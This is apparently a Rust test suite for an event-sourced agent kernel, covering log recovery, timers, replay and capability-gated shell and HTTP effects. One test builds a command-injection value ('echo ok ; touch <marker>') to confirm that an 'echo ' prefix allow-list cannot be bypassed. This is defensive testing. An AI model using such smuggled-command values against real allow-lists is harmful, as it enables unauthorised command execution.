    use cdz_kernel::kernel::{RecoverError, RecoveryReport};
    use cdz_kernel::log_store::{Recovered, RecoveryKind};

    let mut reducer = TwoStepReducer;

    // An empty recovery (no events) is EmptyLog regardless of backend — same contract as the file path.
    let empty = Recovered {
        events: Vec::new(),
        kind: RecoveryKind::Clean,
        good_prefix_len: 0,
    };
    assert!(matches!(
        Session::recover_from(empty, &mut reducer).await,
        Err(RecoverError::EmptyLog)
    ));

    // Produce a real event prefix WITHOUT touching disk: run a session in memory, take its log, and wrap
    // it in a `Recovered` as a non-file backend would after reading its stream.
    let mut exec = RecordingExecutor::new();
    let mut session = Session::genesis(Hash::of(b"two-step-v1"), Hash::of(b"test-spawn-nonce"));
    session
        .deliver(inbound_go(), None, &mut reducer, &http_cap(), &mut exec)
        .await
        .unwrap();
    let full_log = session.log().to_vec();
    let first_dispatch_idx = full_log
        .iter()
        .position(|e| matches!(e.body, EventBody::Dispatched { .. }))
        .unwrap();
    let recovered = Recovered {
        events: full_log[..=first_dispatch_idx].to_vec(),
        kind: RecoveryKind::Clean,
        good_prefix_len: 0, // the fold-and-report core doesn't consult this; it's a heal hint for the backend
    };

    let (restored, report): (Session, RecoveryReport) =
        Session::recover_from(recovered, &mut reducer)
            .await
            .expect("recover_from a hand-built (non-file) Recovered");
    // Identical reconstruction to the file path (session_recover_is_the_one_call_recovery_entry_point).
    assert_eq!(restored.kv().get(b"phase"), Some(&b"fetching"[..]));
    assert_eq!(report.kind, RecoveryKind::Clean);
    assert_eq!(report.open_effects.len(), 1);
    assert_eq!(report.open_effects, restored.open_effect_ids());
}

#[tokio::test(flavor = "current_thread")]
async fn session_recover_surfaces_corruption_to_the_caller() {
    // PR#993 #1 (substantive): the corrupt state must reach the PUBLIC Session::recover caller — the
    // whole point of detecting it. Persist a good genesis then a complete-but-invalid frame; recover
    // must return a report whose kind is Corrupt (with the good prefix still recovered).
    use cdz_kernel::kernel::RecoveryReport;
    use cdz_kernel::log_store::{LogStore, RecoveryKind};
    use std::io::Write;

    let mut path = std::env::temp_dir();
    path.push(format!(
        "cdz-kernel-recover-corrupt-{}.log",
        std::process::id()
    ));
    let _ = std::fs::remove_file(&path);

    let mut reducer = TwoStepReducer;
    // A valid genesis, then a full-but-garbage frame (length matches body, body doesn't decode).
    {
        let mut store = LogStore::open(&path).unwrap();
        store
            .append(&Event {
                seq: 0,
                cause: None,
                body: EventBody::Genesis {
                    reducer: Hash::of(b"two-step-v1"),
                    spawn_nonce: Hash::of(b"test-spawn-nonce"),
                    parent: None,
                },
            })
            .unwrap();
    }
    {
        let mut f = std::fs::OpenOptions::new()
            .append(true)
            .open(&path)
            .unwrap();
        let garbage = [0xFFu8; 6];
        f.write_all(&(garbage.len() as u32).to_le_bytes()).unwrap();
        f.write_all(&garbage).unwrap();
    }

    let (_session, report): (Session, RecoveryReport) = Session::recover(&path, &mut reducer)
        .await
        .expect("recovers the good genesis prefix");
    // The corruption reaches the caller (not dropped) — the fix's whole point.
    assert_eq!(report.kind, RecoveryKind::Corrupt);
    assert!(
        report.is_corrupt(),
        "Session::recover must surface corruption to the caller (PR#993 #1)"
    );
    let _ = std::fs::remove_file(&path);
}

/// A reducer that, on inbound "go", arms a timer for an absolute deadline; when the timer FIRES it
/// records "woke" in KV. Proves the §9c reactive-timer path: reducer never reads a clock, it asks to
/// be woken and the kernel wakes it.
struct TimerReducer {
    deadline_ms: u64,
}
#[async_trait::async_trait(?Send)]
impl Reducer for TimerReducer {
    async fn fold(&mut self, event: &Event, kv: &mut Kv) -> FoldOutput {
        match &event.body {
            EventBody::Inbound { .. } => FoldOutput::with(vec![EffectRequest::new(
                EffectKind::Timer,
                self.deadline_ms.to_string(), // absolute deadline ms (§16c-S5)
                None,
                Timeliness::Interactive,
            )]),
            EventBody::TimerFired { .. } => {
                kv.put(b"woke".to_vec(), b"1".to_vec());
                FoldOutput::none()
            }
            _ => FoldOutput::none(),
        }
    }
}

fn timer_cap() -> Authorizer {
    Authorizer::new(vec![Capability {
        kind: EffectKind::Timer,
        predicate: ResourcePredicate::Any,
    }])
}

#[tokio::test(flavor = "current_thread")]
async fn timer_arms_without_executor_then_kernel_fires_on_deadline() {
    let mut reducer = TimerReducer { deadline_ms: 1000 };
    let mut exec = RecordingExecutor::new();
    let mut session = Session::genesis(Hash::of(b"timer"), Hash::of(b"test-spawn-nonce"));

    session
        .deliver(inbound_go(), None, &mut reducer, &timer_cap(), &mut exec)
        .await
        .unwrap();

    // Arming a timer is NOT an executor call (§9c) — the executor saw nothing...
    assert_eq!(exec.seen.len(), 0);
    // ...the timer is armed as an open obligation with its absolute deadline...
    assert_eq!(session.open_effects(), 1);
    assert_eq!(session.next_timer_deadline(), Some(1000));
    // ...and it has NOT fired yet (reducer hasn't woken).
    assert_eq!(session.kv().get(b"woke"), None);

    // Clock hasn't reached the deadline → nothing fires.
    assert_eq!(
        session
            .fire_due_timers(999, &mut reducer, &timer_cap(), &mut exec)
            .await,
        0
    );
    assert_eq!(session.kv().get(b"woke"), None);

    // Clock reaches the deadline → the kernel fires it, waking the reducer.
    assert_eq!(
        session
            .fire_due_timers(1000, &mut reducer, &timer_cap(), &mut exec)
            .await,
        1
    );
    assert_eq!(session.kv().get(b"woke"), Some(&b"1"[..]));
    // Fired → no longer armed, no longer open.
    assert_eq!(session.next_timer_deadline(), None);
    assert_eq!(session.open_effects(), 0);
}

#[tokio::test(flavor = "current_thread")]
async fn fired_timestamp_is_the_deadline_not_the_wall_clock_that_fired_it() {
    // Determinism (§9c): a timer that fires LATE still records its own deadline as fired_ms, so replay
    // is independent of when fire_due_timers happened to run.
    let mut reducer = TimerReducer { deadline_ms: 500 };
    let mut exec = RecordingExecutor::new();
    let mut session = Session::genesis(Hash::of(b"timer"), Hash::of(b"test-spawn-nonce"));
    session
        .deliver(inbound_go(), None, &mut reducer, &timer_cap(), &mut exec)
        .await
        .unwrap();

    // Fire it "late" at now=9999 — the recorded fired_ms must still be the deadline 500.
    session
        .fire_due_timers(9999, &mut reducer, &timer_cap(), &mut exec)
        .await;
    let fired = session
        .log()
        .iter()
        .find_map(|e| match &e.body {
            EventBody::TimerFired { fired_ms, .. } => Some(*fired_ms),
            _ => None,
        })
        .expect("a TimerFired was recorded");
    assert_eq!(
        fired, 500,
        "fired_ms must be the deadline, not the wall clock (§9c determinism)"
    );
}

#[tokio::test(flavor = "current_thread")]
async fn armed_timer_survives_replay() {
    // §16c-S5: an armed-but-unfired timer must be reconstructed on replay (with its absolute deadline)
    // so a recovered/migrated session still fires it.
    let mut reducer = TimerReducer { deadline_ms: 2000 };
    let mut exec = RecordingExecutor::new();
    let mut session = Session::genesis(Hash::of(b"timer"), Hash::of(b"test-spawn-nonce"));
    session
        .deliver(inbound_go(), None, &mut reducer, &timer_cap(), &mut exec)
        .await
        .unwrap();

    // Replay the log into a fresh session — the armed timer must come back.
    let restored = Session::replay(session.log().to_vec(), &mut reducer)
        .await
        .unwrap();
    assert_eq!(restored.next_timer_deadline(), Some(2000));
    assert_eq!(restored.open_effects(), 1);

    // And it still fires from the recovered state.
    let mut restored = restored;
    assert_eq!(
        restored
            .fire_due_timers(2000, &mut reducer, &timer_cap(), &mut exec)
            .await,
        1
    );
    assert_eq!(restored.kv().get(b"woke"), Some(&b"1"[..]));
}

#[tokio::test(flavor = "current_thread")]
async fn malformed_timer_deadline_is_rejected_not_panicked() {
    // Totality (§17): a non-numeric timer target must be surfaced (as a denial), never panic.
    struct BadTimer;
    #[async_trait::async_trait(?Send)]
    impl Reducer for BadTimer {
        async fn fold(&mut self, event: &Event, _kv: &mut Kv) -> FoldOutput {
            if matches!(event.body, EventBody::Inbound { .. }) {
                FoldOutput::with(vec![EffectRequest::new(
                    EffectKind::Timer,
                    "not-a-number",
                    None,
                    Timeliness::Interactive,
                )])
            } else {
                FoldOutput::none()
            }
        }
    }
    let mut exec = RecordingExecutor::new();
    let mut session = Session::genesis(Hash::of(b"badtimer"), Hash::of(b"test-spawn-nonce"));
    session
        .deliver(inbound_go(), None, &mut BadTimer, &timer_cap(), &mut exec)
        .await
        .unwrap();
    // No timer armed, nothing left open, and a denial recorded for audit.
    assert_eq!(session.next_timer_deadline(), None);
    assert_eq!(session.open_effects(), 0);
    assert!(session
        .log()
        .iter()
        .any(|e| matches!(e.body, EventBody::AuthzDenied { .. })));
}

/// Live shell execution (feature `live-exec`) end-to-end through the kernel: a reducer emits a Shell
/// effect whose target is capability-gated by a command-prefix allow-list (SEC-F1); the real
/// ShellExecutor runs it and the exit/stdout folds back as the result the reducer sees.
#[cfg(all(feature = "live-exec", unix))]
#[tokio::test(flavor = "current_thread")]
async fn live_shell_executor_runs_a_real_command_end_to_end() {
    use cdz_kernel::executor::ShellExecutor;

    // Reducer: on "go", run `echo hi`; on the result, stash whether it succeeded + the stdout.
    struct ShellReducer;
    #[async_trait::async_trait(?Send)]
    impl Reducer for ShellReducer {
        async fn fold(&mut self, event: &Event, kv: &mut Kv) -> FoldOutput {
            match &event.body {
                EventBody::Inbound { .. } => FoldOutput::with(vec![EffectRequest::new(
                    EffectKind::Shell,
                    "echo hi",
                    None,
                    Timeliness::Interactive,
                )]),
                EventBody::EffectResult { result, .. } => {
                    match result {
                        EffectOutcome::Ok(Some(Payload::Inline(bytes))) => {
                            kv.put(b"stdout".to_vec(), bytes.to_vec());
                        }
                        _ => {
                            kv.put(b"stdout".to_vec(), b"<not-ok>".to_vec());
                        }
                    }
                    FoldOutput::none()
                }
                _ => FoldOutput::none(),
            }
        }
    }

    // Capability gates Shell to a command-prefix allow-list (never an `Any` shell grant).
    let authz = Authorizer::new(vec![Capability {
        kind: EffectKind::Shell,
        predicate: ResourcePredicate::Prefix("echo ".into()),
    }]);
    let mut exec = ShellExecutor;
    let mut session = Session::genesis(Hash::of(b"shell"), Hash::of(b"test-spawn-nonce"));
    session
        .deliver(inbound_go(), None, &mut ShellReducer, &authz, &mut exec)
        .await
        .unwrap();

    // The real subprocess ran; its stdout ("hi\n") folded back into KV.
    let stdout = session.kv().get(b"stdout").expect("stdout recorded");
    assert_eq!(String::from_utf8_lossy(stdout).trim(), "hi");
    assert_eq!(session.open_effects(), 0);
}

/// A Shell effect OUTSIDE the capability's command-prefix is denied at the kernel gate (SEC-F1) and
/// never reaches the executor — even the real one.
#[cfg(all(feature = "live-exec", unix))]
#[tokio::test(flavor = "current_thread")]
async fn live_shell_denied_command_never_executes() {
    use cdz_kernel::executor::ShellExecutor;

    // Unique per-pid marker (PR#996: parallel-safe + no false-fail from a pre-existing file). Bind the
    // path once, remove any stale copy at START, and reuse the SAME var in both the touch target and
    // the assertion — so the test proves THIS run's gate, not leftover state.
    let marker = format!("/tmp/cdz-kernel-denied-marker-{}", std::process::id());
    let _ = std::fs::remove_file(&marker);

    struct DeniedShell(String);
    #[async_trait::async_trait(?Send)]
    impl Reducer for DeniedShell {
        async fn fold(&mut self, event: &Event, _kv: &mut Kv) -> FoldOutput {
            if matches!(event.body, EventBody::Inbound { .. }) {
                // Harmless command (PR#992 #3: no `rm -rf` in tests). Outside the `echo ` grant →
                // denied at the gate anyway; the marker would only appear if the gate FAILED.
                FoldOutput::with(vec![EffectRequest::new(
                    EffectKind::Shell,
                    format!("touch {}", self.0),
                    None,
                    Timeliness::Interactive,
                )])
            } else {
                FoldOutput::none()
            }
        }
    }
    // Only `echo ` is permitted → the touch is denied before the executor sees it.
    let authz = Authorizer::new(vec![Capability {
        kind: EffectKind::Shell,
        predicate: ResourcePredicate::Prefix("echo ".into()),
    }]);
    let mut exec = ShellExecutor;
    let mut session = Session::genesis(Hash::of(b"denied"), Hash::of(b"test-spawn-nonce"));
    session
        .deliver(
            inbound_go(),
            None,
            &mut DeniedShell(marker.clone()),
            &authz,
            &mut exec,
        )
        .await
        .unwrap();

    // Denied at the gate → a denial is logged and nothing ran.
    assert!(session
        .log()
        .iter()
        .any(|e| matches!(e.body, EventBody::AuthzDenied { .. })));
    assert_eq!(session.open_effects(), 0);
    // The would-be side effect never happened (marker was removed at start, so this is THIS run's gate).
    assert!(!std::path::Path::new(&marker).exists());
    let _ = std::fs::remove_file(&marker);
}

/// PR#992 WARNING:WARNING: CWE-78: the fix — direct exec (no `sh -c`) makes shell metacharacters LITERAL, so a
/// compound like `echo ok; touch <file>` that passes the `echo ` prefix allow-list does NOT run the
/// second command. Before the fix, `sh -c` executed the `touch`; now `;` and the rest are just literal
/// arguments to `echo`, and the file is never created.
#[cfg(all(feature = "live-exec", unix))]
#[tokio::test(flavor = "current_thread")]
async fn live_shell_no_injection_via_metacharacters() {
    use cdz_kernel::executor::ShellExecutor;

    // Per-pid marker (parallel-safe; consistent with the denied-command test, PR#996).
    let marker = format!("/tmp/cdz-kernel-injection-marker-{}", std::process::id());
    let marker = marker.as_str();
    let _ = std::fs::remove_file(marker); // clean slate

    struct Injector(String);
    #[async_trait::async_trait(?Send)]
    impl Reducer for Injector {
        async fn fold(&mut self, event: &Event, kv: &mut Kv) -> FoldOutput {
            match &event.body {
                // Passes `starts_with("echo ")` but embeds an injection attempt.
                EventBody::Inbound { .. } => FoldOutput::with(vec![EffectRequest::new(
                    EffectKind::Shell,
                    self.0.clone(),
                    None,
                    Timeliness::Interactive,
                )]),
                EventBody::EffectResult {
                    result: EffectOutcome::Ok(Some(Payload::Inline(b))),
                    ..
                } => {
                    kv.put(b"out".to_vec(), b.to_vec());
                    FoldOutput::none()
                }
                _ => FoldOutput::none(),
            }
        }
    }
    let authz = Authorizer::new(vec![Capability {
        kind: EffectKind::Shell,
        predicate: ResourcePredicate::Prefix("echo ".into()),
    }]);
    let mut exec = ShellExecutor;
    let mut session = Session::genesis(Hash::of(b"inject"), Hash::of(b"test-spawn-nonce"));
    let payload = format!("echo ok ; touch {marker}");
    session
        .deliver(
            inbound_go(),
            None,
            &mut Injector(payload),
            &authz,
            &mut exec,
        )
        .await
        .unwrap();

    // The injection did NOT execute: the marker file was never created (no `sh -c` to interpret `;`).
    assert!(
        !std::path::Path::new(marker).exists(),
        "command injection: the `; touch` ran — metacharacters were shell-interpreted (CWE-78)"
    );
    // And `echo` treated the whole thing as literal args (stdout contains the literal `;` and `touch`).
    let out = session.kv().get(b"out").expect("echo ran");
    let text = String::from_utf8_lossy(out);
    assert!(
        text.contains(';') && text.contains("touch"),
        "echo should print its args literally: {text:?}"
    );
}

#[tokio::test(flavor = "current_thread")]
async fn authz_denied_is_folded_live_so_replay_matches() {
    // PR#990 finding #1: a denial is an observable outcome the reducer folds in BOTH paths. A reducer
    // that records denials in KV must reach the SAME kv live and on replay — else event-sourcing's
    // replay-equivalence (the core invariant) is broken.
    struct DenialCounter;
    #[async_trait::async_trait(?Send)]
    impl Reducer for DenialCounter {
        async fn fold(&mut self, event: &Event, kv: &mut Kv) -> FoldOutput {
            match &event.body {
                // Target outside the capability → denied.
                EventBody::Inbound { .. } => FoldOutput::with(vec![EffectRequest::new(
                    EffectKind::Http,
                    "https://denied.host/x",
                    None,
                    Timeliness::Interactive,
                )]),
                EventBody::AuthzDenied { .. } => {
                    let n = kv.get(b"denials").map(|b| b[0]).unwrap_or(0) + 1;
                    kv.put(b"denials".to_vec(), vec![n]);
                    FoldOutput::none()
                }
                _ => FoldOutput::none(),
            }
        }
    }
    // Capability permits only ok.host, so the denied.host effect is denied at the gate.
    let authz = Authorizer::new(vec![Capability {
        kind: EffectKind::Http,
        predicate: ResourcePredicate::HostIn(vec!["ok.host".into()]),
    }]);
    let mut exec = RecordingExecutor::new();
    let mut session = Session::genesis(Hash::of(b"denial"), Hash::of(b"test-spawn-nonce"));
    session
        .deliver(inbound_go(), None, &mut DenialCounter, &authz, &mut exec)
        .await
        .unwrap();

    // Live: the reducer folded the denial → counter is 1, and the executor never ran.
    assert_eq!(session.kv().get(b"denials"), Some(&[1u8][..]));
    assert_eq!(exec.seen.len(), 0);
    let live_root = session.snapshot().kv_root;

    // Replay: must reconstruct the SAME kv (the denial is folded in replay too, matching live).
    let replayed = Session::replay(session.log().to_vec(), &mut DenialCounter)
        .await
        .unwrap();
    assert_eq!(replayed.kv().get(b"denials"), Some(&[1u8][..]));
    assert_eq!(
        replayed.snapshot().kv_root,
        live_root,
        "live kv must equal replayed kv even with a denial in the log (finding #1)"
    );
}

#[tokio::test(flavor = "current_thread")]
async fn replay_rejects_a_genesis_less_log_loudly() {
    // PR#990 finding #2: a Genesis-less log is corruption. The public boot path (replay) FAILS LOUDLY
    // rather than masking it — so a Session is only ever constructed WITH a Genesis first event, which
    // is exactly why reducer_hash's now-panicking invariant is unreachable in practice.
    struct Inert;
    #[async_trait::async_trait(?Send)]
    impl Reducer for Inert {
        async fn fold(&mut self, _e: &Event, _kv: &mut Kv) -> FoldOutput {
            FoldOutput::none()
        }
    }
    let genesis_less = vec![Event {
        seq: 0,
        cause: None,
        body: EventBody::Inbound {
            content_type: ContentType {
                family: "m".into(),
                version: 1,
            },
            payload: Payload::Inline(vec![].into()),
        },
    }];
    assert!(
        Session::replay(genesis_less, &mut Inert).await.is_err(),
        "replay must reject a log whose first event is not Genesis (finding #2 fail-loud)"
    );
}
